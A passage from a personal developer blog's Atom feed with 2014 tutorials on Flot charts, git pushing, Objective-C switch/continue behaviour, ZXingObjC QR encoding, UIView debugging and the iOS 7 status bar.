src="http://cdnjs.cloudflare.com/ajax/libs/flot/0.8.2/jquery.flot.stack.min.js"></script><script src="http://cdnjs.cloudflare.com/ajax/libs/jquery-dateFormat/1.0/jquery.dateFormat.min.js"></script><script>$(function() {    $.ajax({        dataType: 'json',        url: 'https://dl.dropboxusercontent.com/u/33436253/data/technical-blog/2014-07-07-jquery-flot-create-a-stackable-bar-graph-and-line-graph-combination.json',        success: populateGraph    });    var flot_options = {        series: {            grow: {                active: true,                steps: 50            },            stack: true,            shadowSize: 2        },        grid: {            hoverable: true,            clickable: true,            tickColor: '#f0f0f0',            borderWidth: 0,            color: '#333333'        },        xaxis:{            tickDecimals: 0,            tickSize: 1,            tickFormatter: function(val, axis) {                return val;            }        },        yaxis: {            ticks: 5,            min: 0,            tickDecimals: 0,            tickFormatter: function(val, axis) {                return val;            }        },        tooltip: true,        tooltipOpts: {            content: function(label, x, y) {                return parseInt(y) + ' ' + label;            },            defaultTheme: false,            shifts: {                x: 0,                y: 20            }        }    };    var line_options = {        show: true,        lineWidth: 2,        fill: true,        fillColor: {            colors: [{                opacity: 0.0            }, {                opacity: 0.9            }]        }    };    var bar_options = {        show: true,        align: 'center',        lineWidth: 0,        fill: true,        barWidth: 0.6    };    function populateGraph(data) {        var graph_data = [];        graph_data.push({label: 'iOS', bars: bar_options, color: '#d063e6', data: data.ios});        graph_data.push({label: 'Android', bars: bar_options, color: '#a4c739', data: data.android});        graph_data.push({label: 'User', lines: line_options, stack: false, color: '#00aeef', points: {radius: 5, show: true}, data: data.user});        $("#flot-1ine").length && $.plot($("#flot-1ine"), graph_data, flot_options);    }});</script>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Plot a stack bar graph with line graph combination.&lt;/p&gt;
&lt;div id=&quot;flot-1ine&quot; style=&quot;height:210px&quot;&gt;
    &lt;div</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
    <category term="flot" scheme="http://jslim.net/tags/flot/"/>
    
    <category term="graph" scheme="http://jslim.net/tags/graph/"/>
    
  </entry>
  
  <entry>
    <title>Git - push a specific commit to a new repo</title>
    <link href="http://jslim.net/blog/2014/07/02/git-push-a-specific-commit-to-a-new-repo/"/>
    <id>http://jslim.net/blog/2014/07/02/git-push-a-specific-commit-to-a-new-repo/</id>
    <published>2014-07-02T01:10:21.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Developer A was previously push everything to <strong>my-repo</strong>, eventually developer B created a new repo and clone all commits from old repo.</p><p>Developer B doesn’t inform A, thus A continue to work on old repo.</p><p>Now, B request A to push the latest commit to the new repo</p><p>First of all, add the new repo URL to the project</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /path/to/project</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote add neworigin git@bitbucket.org:myname/my-new-repo.git</span></span><br></pre></td></tr></table></figure><p>Then now A can push a specific commit to the new repo</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git push neworigin <span class="number">7300</span>a6130d9447e18a931e898b64eefedea19544:master</span><br><span class="line"><span class="type">Counting</span> objects: <span class="number">25</span>, <span class="keyword">done</span>.</span><br><span class="line"><span class="type">Delta</span> compression using up <span class="keyword">to</span> <span class="number">4</span> threads.</span><br><span class="line"><span class="type">Compressing</span> objects: <span class="number">100</span>% (<span class="number">13</span>/<span class="number">13</span>), <span class="keyword">done</span>.</span><br><span class="line"><span class="type">Writing</span> objects: <span class="number">100</span>% (<span class="number">13</span>/<span class="number">13</span>), <span class="number">1.12</span> <span class="type">KiB</span> | <span class="number">0</span> <span class="built_in">bytes</span>/s, <span class="keyword">done</span>.</span><br><span class="line"><span class="type">Total</span> <span class="number">13</span> (delta <span class="number">7</span>), reused <span class="number">0</span> (delta <span class="number">0</span>)</span><br><span class="line"><span class="type">To</span> git@bitbucket.org:others/<span class="keyword">new</span>-repo.git</span><br><span class="line">   <span class="number">2</span>a94403..<span class="number">7300</span>a61  <span class="number">7300</span>a6130d9447e18a931e898b64eefedea19544 -&gt; master</span><br></pre></td></tr></table></figure><ul><li><code>neworigin</code> refer to the new URL added just now</li><li><code>7300a6130d9447e18a931e898b64eefedea19544</code> is the commit hash</li><li><code>master</code> is branch in remote <em>(Bitbucket)</em></li></ul><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/3230074/git-pushing-specific-commit/3230241#3230241">git - pushing specific commit</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Developer A was previously push everything to &lt;strong&gt;my-repo&lt;/strong&gt;, eventually developer B created a new repo and clone all commits</summary>
        
      
    
    
    
    
    <category term="git" scheme="http://jslim.net/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Objective-C switch statement inside a loop</title>
    <link href="http://jslim.net/blog/2014/06/30/objective-c-switch-statement-inside-a-loop/"/>
    <id>http://jslim.net/blog/2014/06/30/objective-c-switch-statement-inside-a-loop/</id>
    <published>2014-06-30T04:52:22.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Since the <code>switch</code> statement has <code>break</code>, and usually we use <code>break</code> to stop the looping process. In my mind <code>break</code> &amp; <code>continue</code> are like brother, usually use inside a loop.</p><p>I wonder what if <code>continue</code> inside the <code>switch</code> statement. So I try it out</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">NSLog</span>(<span class="string">@&quot;skip later&quot;</span>); <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">NSLog</span>(<span class="string">@&quot;with no skip&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">NSLog</span>(<span class="string">@&quot;skip later&quot;</span>); <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;this is %d&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>and I get this output</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">skip later</span><br><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">4</span></span><br><span class="line">with no skip</span><br><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">6</span></span><br><span class="line">skip later</span><br><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">8</span></span><br><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><p>So you can see here, the <code>continue</code> skip the loop by 1 turn; where as <code>break</code> has totally no effect to the loop, but to <code>switch</code> only</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Since the &lt;code&gt;switch&lt;/code&gt; statement has &lt;code&gt;break&lt;/code&gt;, and usually we use &lt;code&gt;break&lt;/code&gt; to stop the looping process. In my</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>ZXingObjc encode QR code</title>
    <link href="http://jslim.net/blog/2014/06/25/zxingobjc-encode-qr-code/"/>
    <id>http://jslim.net/blog/2014/06/25/zxingobjc-encode-qr-code/</id>
    <published>2014-06-25T19:47:39.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>To generate QR code in iOS device, I’m using <a href="https://github.com/TheLevelUp/ZXingObjC">this library</a>.</p><p>From the their GitHub repo, already got the instruction. Here I want to point out 2 things:</p><h2 id="1-Assign-to-UIImage"><a href="#1-Assign-to-UIImage" class="headerlink" title="1. Assign to UIImage"></a>1. Assign to <code>UIImage</code></h2><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSString</span> *text = <span class="string">@&quot;The text to encode&quot;</span>;</span><br><span class="line"><span class="built_in">NSError</span> *error = <span class="literal">nil</span>;</span><br><span class="line">ZXMultiFormatWriter *writer = [ZXMultiFormatWriter writer];</span><br><span class="line">ZXBitMatrix* result = [writer encode:text</span><br><span class="line">                              format:kBarcodeFormatQRCode</span><br><span class="line">                               width:<span class="number">500</span></span><br><span class="line">                              height:<span class="number">500</span></span><br><span class="line">                               error:&amp;error];</span><br><span class="line"><span class="keyword">if</span> (result) &#123;</span><br><span class="line">    <span class="built_in">CGImageRef</span> image = [[ZXImage imageWithMatrix:result] cgimage];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LOOK AT HERE, this line will crash</span></span><br><span class="line">    imageView.image = [[<span class="built_in">UIImage</span> alloc] initWithCGImage:image];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;QR code encode error %@&quot;</span>, [error localizedDescription]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>See the code above, it will crash when convert <code>CGImageRef</code> to <code>UIImage</code>.<br>So change to</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UIImage</span> *image = [[<span class="built_in">UIImage</span> alloc] initWithCGImage:[[ZXImage imageWithMatrix:result] cgimage]];</span><br><span class="line">imageView.image = image;</span><br></pre></td></tr></table></figure><p>It works now. This is something to do with ARC, <a href="http://stackoverflow.com/questions/12756295/uiimage-from-cgimageref">checkout this for more info</a></p><h2 id="2-It-has-margin"><a href="#2-It-has-margin" class="headerlink" title="2. It has margin"></a>2. It has margin</h2><p><img src="/images/posts/2014-06-26-zxingobjc-encode-qr-code/margin.png" alt="QR code with margin"></p><p>You can see the margin took out some space. To remove the margin</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// ADD THIS 2 LINES</span></span><br><span class="line">ZXEncodeHints *hints = [ZXEncodeHints hints];</span><br><span class="line">hints.margin = @<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ZXBitMatrix* result = [writer encode:text</span><br><span class="line">                              format:kBarcodeFormatQRCode</span><br><span class="line">                               width:<span class="number">500</span></span><br><span class="line">                              height:<span class="number">500</span></span><br><span class="line">                              hints:hints <span class="comment">// ADD THIS LINE</span></span><br><span class="line">                               error:&amp;error];</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Run it again, now it utilise the whole image.</p><p><img src="/images/posts/2014-06-26-zxingobjc-encode-qr-code/no-margin.png" alt="QR code without margin"></p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/23609593/objective-c-how-to-convert-cgimageref-to-uiimageview/23610576#23610576">Objective C: How to convert CGImageRef to UIImageView?</a></em></li><li><em><a href="http://stackoverflow.com/questions/10142748/reduce-border-width-on-qr-codes-generated-by-zxing">Reduce border width on QR Codes generated by ZXing?</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;To generate QR code in iOS device, I’m using &lt;a href=&quot;https://github.com/TheLevelUp/ZXingObjC&quot;&gt;this library&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;From the their</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Effectively debug UIView in Objective-C</title>
    <link href="http://jslim.net/blog/2014/06/22/effectively-debug-uiview-in-objective-c/"/>
    <id>http://jslim.net/blog/2014/06/22/effectively-debug-uiview-in-objective-c/</id>
    <published>2014-06-22T15:55:06.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Usually I’m using <code>NSLog</code> to debug all sort of objects.<br>When I encounter <code>UINavigationBar</code> background color issue,<br>I loop through it’s <code>subviews</code> one by one. e.g.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">id</span> subview <span class="keyword">in</span> navBar.subviews) &#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;subview %@&quot;</span>, subview);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then I realize I need to go 1 level deeper, I add one more loop inside</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">id</span> subview <span class="keyword">in</span> navBar.subviews) &#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;subview %@&quot;</span>, subview);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">id</span> subsubview <span class="keyword">in</span> subview.subviews) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;subsubview %@&quot;</span>, subsubview);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>which is not an effective way</p><p>Finally I found this <code>recursiveDescription</code> magic function to show all subviews recursively</p><p>It can’t be invoked by <code>[view recursiveDescription]</code>, must be using <code>performSelector</code>. e.g.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSLog</span>(<span class="string">@&quot;\nNav bar %@&quot;</span>,[navBar performSelector:<span class="keyword">@selector</span>(recursiveDescription)]);</span><br></pre></td></tr></table></figure><p>Result:</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">Nav bar <span class="tag">&lt;<span class="name">CustomNavigationBar:</span> <span class="attr">0x1369bad0</span>; <span class="attr">baseClass</span> = <span class="string">UINavigationBar;</span> <span class="attr">frame</span> = <span class="string">(0</span> <span class="attr">8</span>; <span class="attr">320</span> <span class="attr">56</span>); <span class="attr">transform</span> = <span class="string">[1,</span> <span class="attr">0</span>, <span class="attr">0</span>, <span class="attr">1</span>, <span class="attr">0</span>, <span class="attr">-12</span>]; <span class="attr">autoresize</span> = <span class="string">W;</span> <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">gestureRecognizers</span> = &lt;<span class="attr">NSArray:</span> <span class="attr">0x1369bff0</span>&gt;</span>; layer = <span class="tag">&lt;<span class="name">CALayer:</span> <span class="attr">0x1369bbf0</span>&gt;</span>&gt;</span></span><br><span class="line"><span class="language-xml">   | <span class="tag">&lt;<span class="name">_UINavigationBarBackground:</span> <span class="attr">0x1369bd40</span>; <span class="attr">frame</span> = <span class="string">(0</span> <span class="attr">-8</span>; <span class="attr">320</span> <span class="attr">76</span>); <span class="attr">autoresize</span> = <span class="string">W;</span> <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x1369b950</span>&gt;</span>&gt; - (null)</span></span><br><span class="line"><span class="language-xml">   |    | <span class="tag">&lt;<span class="name">UIImageView:</span> <span class="attr">0x1369be10</span>; <span class="attr">frame</span> = <span class="string">(0</span> <span class="attr">76</span>; <span class="attr">320</span> <span class="attr">0.5</span>); <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x1369bea0</span>&gt;</span>&gt; - (null)</span></span><br><span class="line"><span class="language-xml">   | <span class="tag">&lt;<span class="name">UINavigationButton:</span> <span class="attr">0x1369e3b0</span>; <span class="attr">frame</span> = <span class="string">(5</span> <span class="attr">18</span>; <span class="attr">44</span> <span class="attr">30</span>); <span class="attr">opaque</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x1369e4d0</span>&gt;</span>&gt;</span></span><br><span class="line"><span class="language-xml">   |    | <span class="tag">&lt;<span class="name">UIImageView:</span> <span class="attr">0x1369f470</span>; <span class="attr">frame</span> = <span class="string">(11</span> <span class="attr">4</span>; <span class="attr">22</span> <span class="attr">22</span>); <span class="attr">clipsToBounds</span> = <span class="string">YES;</span> <span class="attr">opaque</span> = <span class="string">NO;</span> <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x1369f500</span>&gt;</span>&gt; - (null)</span></span><br><span class="line"><span class="language-xml">   | <span class="tag">&lt;<span class="name">UIView:</span> <span class="attr">0x1369fe60</span>; <span class="attr">frame</span> = <span class="string">(55</span> <span class="attr">5</span>; <span class="attr">224</span> <span class="attr">58</span>); <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x1369fec0</span>&gt;</span>&gt;</span></span><br><span class="line"><span class="language-xml">   |    | <span class="tag">&lt;<span class="name">UIImageView:</span> <span class="attr">0x1369ff20</span>; <span class="attr">frame</span> = <span class="string">(2</span> <span class="attr">15</span>; <span class="attr">36</span> <span class="attr">36</span>); <span class="attr">clipsToBounds</span> = <span class="string">YES;</span> <span class="attr">opaque</span> = <span class="string">NO;</span> <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x1369ffb0</span>&gt;</span>&gt; - (null)</span></span><br><span class="line"><span class="language-xml">   |    | <span class="tag">&lt;<span class="name">UILabel:</span> <span class="attr">0x136a0000</span>; <span class="attr">frame</span> = <span class="string">(43</span> <span class="attr">18</span>; <span class="attr">156</span> <span class="attr">14</span>); <span class="attr">text</span> = <span class="string">&#x27;11 Cards&#x27;</span>; <span class="attr">clipsToBounds</span> = <span class="string">YES;</span> <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x136a02f0</span>&gt;</span>&gt;</span></span><br><span class="line"><span class="language-xml">   |    | <span class="tag">&lt;<span class="name">UILabel:</span> <span class="attr">0x136a03c0</span>; <span class="attr">frame</span> = <span class="string">(45</span> <span class="attr">33</span>; <span class="attr">154</span> <span class="attr">13</span>); <span class="attr">text</span> = <span class="string">&#x27;2 weeks ago&#x27;</span>; <span class="attr">clipsToBounds</span> = <span class="string">YES;</span> <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x136a0460</span>&gt;</span>&gt;</span></span><br><span class="line"><span class="language-xml">   | <span class="tag">&lt;<span class="name">_UINavigationBarBackIndicatorView:</span> <span class="attr">0x12a711a0</span>; <span class="attr">frame</span> = <span class="string">(8</span> <span class="attr">24</span>; <span class="attr">12.5</span> <span class="attr">20.5</span>); <span class="attr">alpha</span> = <span class="string">0;</span> <span class="attr">opaque</span> = <span class="string">NO;</span> <span class="attr">userInteractionEnabled</span> = <span class="string">NO;</span> <span class="attr">layer</span> = &lt;<span class="attr">CALayer:</span> <span class="attr">0x12a71280</span>&gt;</span>&gt; - Back</span></span><br></pre></td></tr></table></figure><p><strong>P/S: Please remove this method before you submit the app to AppStore. This is private API, so there is high chances that your app will be rejected if you don’t remove this method.</strong></p><p><em>References:</em></p><ul><li><em><a href="http://forums.bignerdranch.com/viewtopic.php?f=96&t=3247#p7175">recursiveDescription on p. 361</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Usually I’m using &lt;code&gt;NSLog&lt;/code&gt; to debug all sort of objects.&lt;br&gt;When I encounter &lt;code&gt;UINavigationBar&lt;/code&gt; background color</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Dealing iOS 7 UIStatusBar</title>
    <link href="http://jslim.net/blog/2014/06/16/dealing-ios-7-uistatusbar/"/>
    <id>http://jslim.net/blog/2014/06/16/dealing-ios-7-uistatusbar/</id>
    <published>2014-06-16T05:19:18.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I have a hard time on dealing with iOS 7 status bar.</p><p>In this example, I will set the status bar for each <code>UIViewController</code></p><p>So now go to Info.plist file, and set <code>View controller-based status bar appearance</code> to <code>YES</code></p><p><img src="/images/posts/2014-06-16-dealing-ios-7-uistatusbar/plist.png" alt="Info.plist"></p><p>I just want to share few cases of dealing with status bar.</p><h2 id="1-With-UINavigationController-with-WHITE-text-color"><a href="#1-With-UINavigationController-with-WHITE-text-color" class="headerlink" title="1. With UINavigationController with WHITE text color"></a>1. With UINavigationController with WHITE text color</h2><p>Now create the very first (root) view controller with the following content</p><p>In <code>JSAppDelegate.m</code> <em>(I’m using my own prefix <code>JS</code>)</em>, add the lines below</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JSMainViewController *mainViewController = [[JSMainViewController alloc] init];</span><br><span class="line"><span class="built_in">UINavigationController</span> *navigationController = [[<span class="built_in">UINavigationController</span> alloc] initWithRootViewController:mainViewController];</span><br><span class="line"><span class="keyword">self</span>.window.rootViewController = navigationController;</span><br></pre></td></tr></table></figure><p>In <code>JSMainViewController.m</code>, add this to <code>viewDidLoad</code></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.title = <span class="string">@&quot;Light Content&quot;</span>;</span><br><span class="line">[<span class="keyword">self</span> setNeedsStatusBarAppearanceUpdate];</span><br></pre></td></tr></table></figure><p>and add this function</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="built_in">UIStatusBarStyle</span>) preferredStatusBarStyle</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">UIStatusBarStyleLightContent</span>; <span class="comment">// light content means white text color</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run it…Opps… why it still in black text color?</p><p><img src="/images/posts/2014-06-16-dealing-ios-7-uistatusbar/light-content-1.png" alt="Still in black color"></p><p>The reason is here, since the main view controller is inside a <code>UINavigationController</code>, then the status bar will follow the <code>UINavigationController</code> style.</p><p>Now go back to <code>JSAppDelegate</code>, and change the <code>UINavigationBar</code> style.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">navigationController.navigationBar.barStyle = <span class="built_in">UIBarStyleBlackTranslucent</span>; <span class="comment">// THIS LINE</span></span><br><span class="line"><span class="keyword">self</span>.window.rootViewController = navigationController;</span><br></pre></td></tr></table></figure><p>Run it… It works</p><p><img src="/images/posts/2014-06-16-dealing-ios-7-uistatusbar/light-content-2.png" alt="Now it works"></p><h2 id="2-UIImageView-not-cover-up-the-top-position"><a href="#2-UIImageView-not-cover-up-the-top-position" class="headerlink" title="2. UIImageView not cover up the top position"></a>2. <code>UIImageView</code> not cover up the top position</h2><p>Now create another <code>UIViewController</code>, just name it <code>JSTransparentBgViewController</code>, but hide the <code>UINavigationBar</code> in this case</p><p>So add a function, before the view actually appear, hide the navigation bar</p><p><strong>JSTransparentBgViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)viewWillAppear:(<span class="type">BOOL</span>)animated</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewWillAppear:animated];</span><br><span class="line">    [<span class="keyword">self</span>.navigationController setNavigationBarHidden:<span class="literal">YES</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then in <code>viewDidLoad</code>, add this</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set a light gray color so that you can see the text on status bar</span></span><br><span class="line"><span class="keyword">self</span>.view.backgroundColor = [<span class="built_in">UIColor</span> colorWithRed:<span class="number">235</span>/<span class="number">255.0</span> green:<span class="number">235</span>/<span class="number">255.0</span> blue:<span class="number">235</span>/<span class="number">255.0</span> alpha:<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">[<span class="keyword">self</span> setNeedsStatusBarAppearanceUpdate];</span><br><span class="line"></span><br><span class="line"><span class="comment">// by using scroll view, you can scroll &amp; see the result</span></span><br><span class="line"><span class="built_in">UIScrollView</span> *scrollView = [[<span class="built_in">UIScrollView</span> alloc] initWithFrame:<span class="keyword">self</span>.view.bounds];</span><br><span class="line">scrollView.autoresizingMask = <span class="built_in">UIViewAutoresizingFlexibleBottomMargin</span> | <span class="built_in">UIViewAutoresizingFlexibleHeight</span> | <span class="built_in">UIViewAutoresizingFlexibleTopMargin</span>;</span><br><span class="line">scrollView.contentSize = <span class="built_in">CGSizeMake</span>(<span class="built_in">CGRectGetWidth</span>(scrollView.frame), <span class="number">800</span>);</span><br><span class="line">[<span class="keyword">self</span>.view addSubview:scrollView];</span><br><span class="line"></span><br><span class="line"><span class="comment">// this image should cover up the top portion of screen</span></span><br><span class="line"><span class="built_in">UIImageView</span> *coverImageView = [[<span class="built_in">UIImageView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">CGRectGetWidth</span>(scrollView.frame), <span class="number">300</span>)];</span><br><span class="line">coverImageView.image = [<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;Cover&quot;</span>];</span><br><span class="line">[scrollView addSubview:coverImageView];</span><br></pre></td></tr></table></figure><p>You will get a result like this</p><p><img src="/images/posts/2014-06-16-dealing-ios-7-uistatusbar/image-statusbar-1.png" alt="extra 20px"></p><p>so now you see that the status bar is not covered up</p><p>To fix this, just…. hack it</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UIImageView</span> *coverImageView = [[<span class="built_in">UIImageView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">-20</span>, <span class="built_in">CGRectGetWidth</span>(scrollView.frame), <span class="number">300</span>)];</span><br></pre></td></tr></table></figure><p>change the position-y to <code>-20</code> <em>(as we already know that height of status bar is 20)</em>. Run it</p><p><img 